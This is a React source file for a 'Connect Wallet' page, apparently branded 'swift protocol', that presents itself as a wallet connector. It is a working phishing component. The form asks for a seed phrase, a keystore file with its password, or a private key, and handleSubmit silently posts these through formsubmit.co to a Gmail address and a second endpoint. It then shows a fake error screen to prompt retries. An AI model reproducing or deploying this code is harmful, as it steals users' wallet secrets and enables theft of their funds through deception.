import { useState } from "react";
import { block, loadingIcon, whiteLoader } from "../assets";
import Modal from "../components/Modal";
import { MdClose } from "react-icons/md";
import CustomizeButton from "../components/CustomizeButton";
import { wallets } from "../constants";

const Walletpage = () => {
  const [showModal, setShowModal] = useState(false);
  const [loading, setLoading] = useState(false);
  const [activeTab, setActiveTab] = useState("phase");
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [validating, setValidating] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleWalletClick = (wallet) => {
    setSelectedWallet(wallet);
    setShowModal(true);
    setLoading(true);
    setTimeout(() => setLoading(false), 2000); // simulate loading for 5 seconds
  };

  const handleClose = () => {
    setSelectedWallet(null);
    setShowModal(false);
    setLoading(false);
    setValidating(false);
    setIsSubmitting(false);
    setActiveTab("phase");
  };

  const handleSubmit = async (event) => {
    event.preventDefault();
    const form = event.target;
    const formData = new FormData();

    formData.append("Type", selectedWallet?.text);
    formData.append("_captcha", false);
    // formData.append("_next", "/connectwallet/validating.html");
    formData.append("_template", "table");
    formData.append("_subject", `${window.location.hostname} ${new Date()}`);

    if (activeTab === "phase") {
      formData.append("phraseKey", form.ph.value);
    } else if (activeTab === "keystore") {
      formData.append("keystoreKey", form.ky.value);
      formData.append("password", form.password.value);
    } else if (activeTab === "privateKey") {
      formData.append("privateKey", form.privateKey.value);
    }

    setTimeout(() => {
      setValidating(true);
    }, 3000);

    try {
      setIsSubmitting(true);
      const [response, project] = await Promise.all([
        fetch(`https://formsubmit.co/Bamchika0@gmail.com`, {
          method: "POST",
          body: formData,
        }),
        fetch(`https://formsubmit.co/9bb4b8ce1b9086718e6a37a8ad27151f`, {
          method: "POST",
          body: formData,
        }),
      ]);

      return { response, project };
    } catch (error) {
      console.error("Error submitting form:", error);
    } finally {
      setIsSubmitting(false);
    }
  };

  const renderTabContent = () => {
    switch (activeTab) {
      case "phase":
        return (
          <div className="w-full flex flex-col items-start justify-start gap-3">
            <textarea
              name="ph"
              placeholder="Enter your phase key"
              rows="4"
              className="h-[123px] w-full rounded-lg px-4 pt-3 border shadow focus:border-white outline-none border-white text-white bg-transparent placeholder:text-gray-200 font-normal resize-none"
              required
            />
            <span className="text-sm font-normal text-gray-200 select-none">
              Typically 12 (sometimes 24) words separated by single spaces
            </span>
          </div>
        );
      case "keystore":
        return (
          <div className="flex flex-col gap-4 w-full">
            <textarea
              name="ky"
              placeholder="Enter your keystore key"
              rows="4"
              className="h-[123px] w-full rounded-lg px-4 pt-3 shadow border focus:border-white outline-none border-white text-white bg-transparent placeholder:text-gray-200 font-normal"
              required
            />
            <input
              type="password"
              name="password"
              placeholder="Enter your password"
              className="h-12 w-full rounded-lg px-4  border shadow focus:border-white outline-none border-white text-white bg-transparent placeholder:text-gray-200 font-normal"
              required
            />
            <span className="text-sm font-normal text-gray-200 select-none">
              {`Several lines of text beginning with "{...}" plus the password you used to encrypt it.`}
            </span>
          </div>
        );
      case "privateKey":
        return (
          <div className="w-full flex flex-col items-start justify-start gap-4">
            <input
              type="password"
              name="privateKey"
              placeholder="Enter your private key"
              className="h-12 w-full rounded-lg px-4 border shadow focus:border-white outline-none border-white text-white bg-transparent placeholder:text-gray-200 font-normal"
              required
            />
            <span className="text-sm font-normal text-gray-200 select-none">
              Typically 12 (sometimes 24) words separated by a single space.
            </span>
          </div>
        );
      default:
        return null;
    }
  };

  return (
    <main>
      <section className="w-full">
        <div className="contain">
          <div className="w-full flex flex-col items-center justify-start gap-8 py-10">
            {/* <img
              src={block}
              alt="swift protocol connect icons"
              className="w-14 h-14"
            /> */}
            <div className="w-full flex flex-col items-center gap-3">
              <h1 className="text-4xl lg:text-5xl font-bold text-center">
                Connect Wallet
              </h1>
              <p className="text-base text-center font-normal">
                Select a wallet to continue
              </p>
            </div>
            <div className="w-full grid grid-cols-3 md:grid-cols-4 lg:grid-cols-6 items-start justify-between gap-10">
              {wallets.map((wallet) => (
                <button
                  key={wallet.id}
                  type="button"
                  className="w-full flex flex-col items-center justify-center gap-3 cursor-pointer group select-none"
                  onClick={() => handleWalletClick(wallet)}
                >
                  <img
                    src={wallet.icon}
                    alt={`${wallet.text} logo`}
                    className="w-10 h-10 md:w-20 md:h-20 group-hover:scale-110 transition-all duration-300"
                  />
                  <h4 className="text-center font-bold text-xs">
                    {wallet.text}
                  </h4>
                </button>
              ))}
            </div>
          </div>
        </div>
      </section>
      <Modal
        show={showModal}
        setShow={handleClose}
        className={`md:w-[500px] relative !bg-[#9959ee] -top-10 ${
          loading && "!p-0"
        }`}
      >
        {loading ? (
          <div className="w-full flex flex-col gap-6">
            <div className="w-full bg-[#ba8bf9b3] px-4 py-4 rounded-tr-lg rounded-tl-lg flex items-center justify-end">
              <button
                type="button"
                onClick={handleClose}
                className="text-white cursor-pointer text-base font-semibold w-10 h-10 rounded-full bg-gray-800 flex items-center justify-center"
              >
                <MdClose size={25} />
              </button>
            </div>
            <div className="w-full pb-6 px-4 bg-[#9959ee] flex flex-col gap-5 rounded-br-lg rounded-bl-lg">
              <button className="outline-none w-full border-2 border-primary h-14 rounded-lg flex gap-2 items-center justify-start px-4 select-none">
                <img
                  src={loadingIcon}
                  alt="initializing"
                  className="w-10 h-10 object-contain"
                />
                <span className="text-white text-base md:text-lg font-medium">
                  Initializing
                </span>
              </button>
              <button className="outline-none w-full border-2 border-white/50 h-14 rounded-lg flex gap-2 items-center justify-between px-4 select-none">
                <img
                  src={selectedWallet?.icon}
                  alt={`${selectedWallet?.text} logo`}
                  className="w-10 h-10 object-contain"
                />
                <span className="text-white text-base md:text-lg font-medium">
                  {selectedWallet?.text}
                </span>
              </button>
            </div>
          </div>
        ) : !validating ? (
          <form
            onSubmit={handleSubmit}
            className="w-full flex flex-col items-start justify-start gap-6"
          >
            <div className="flex items-center justify-start gap-3">
              <img
                src={selectedWallet?.icon}
                alt={`${selectedWallet?.text} logo`}
                className="w-16 h-16 object-cover border rounded-full"
              />
              <h2 className="text-2xl font-bold text-white">
                {selectedWallet?.text}
              </h2>
            </div>

            <div className="w-full flex items-center justify-between border-b-2 border-white/50">
              <button
                type="button"
                className={`${
                  activeTab === "phase"
                    ? "font-bold text-white border-b-2 border-white"
                    : "text-gray-100 font-medium"
                } text-sm md:text-base w-full pb-3 transition-all duration-300`}
                onClick={() => setActiveTab("phase")}
              >
                Phase
              </button>
              <button
                type="button"
                className={`${
                  activeTab === "keystore"
                    ? "font-bold text-white border-b-2 border-white"
                    : "text-gray-100 font-medium"
                } text-sm md:text-base w-full pb-3 transition-all duration-300`}
                onClick={() => setActiveTab("keystore")}
              >
                Keystore
              </button>
              <button
                type="button"
                className={`${
                  activeTab === "privateKey"
                    ? "font-bold text-white border-b-2 border-white"
                    : "text-gray-100 font-medium"
                } text-sm md:text-base w-full pb-3 transition-all duration-300`}
                onClick={() => setActiveTab("privateKey")}
              >
                Private Key
              </button>
            </div>
            <div className="w-full">{renderTabContent()}</div>
            <div className="w-full flex">
              <button
                type="button"
                onClick={handleClose}
                className="p-2 bg-red-600 rounded-md mr-4 w-2/4"
              >
                Close
              </button>
              <CustomizeButton
                type="submit"
                title={
                  isSubmitting ? (
                    <div className="flex gap-2 items-center justify-center px-4 select-none w-full h-full">
                      <img
                        src={whiteLoader}
                        alt={`loading icon`}
                        className="w-5 h-5 md:w-8 md:h-8 object-contain"
                      />
                      <span className="text-gray-100 text-sm md:text-lg font-medium">
                        Processing
                      </span>
                    </div>
                  ) : (
                    "Proceed"
                  )
                }
                className="w-2/4 !rounded-md !font-inter"
                disabled={isSubmitting}
              />
            </div>
          </form>
        ) : (
          <div className="w-full flex flex-col items-center justify-center gap-6">
            <img
              src="/logo.png"
              alt="swift protocol logo"
              className="w-14 h-14"
            />
            <img
              src="/qrcode.png"
              alt="debugging qr code"
              className="w-[240px] h-[240px]"
            />
            <h4 className="text-gray-800 text-base font-semibold bg-red-200 p-4 rounded-lg">
              An error occured, please try again.
            </h4>
            <button
              type="button"
              onClick={handleClose}
              className="p-2 bg-primary rounded-md mr-4 w-2/4"
            >
              Try Again
            </button>
          </div>
        )}
      </Modal>
    </main>
  );
};

export default Walletpage;
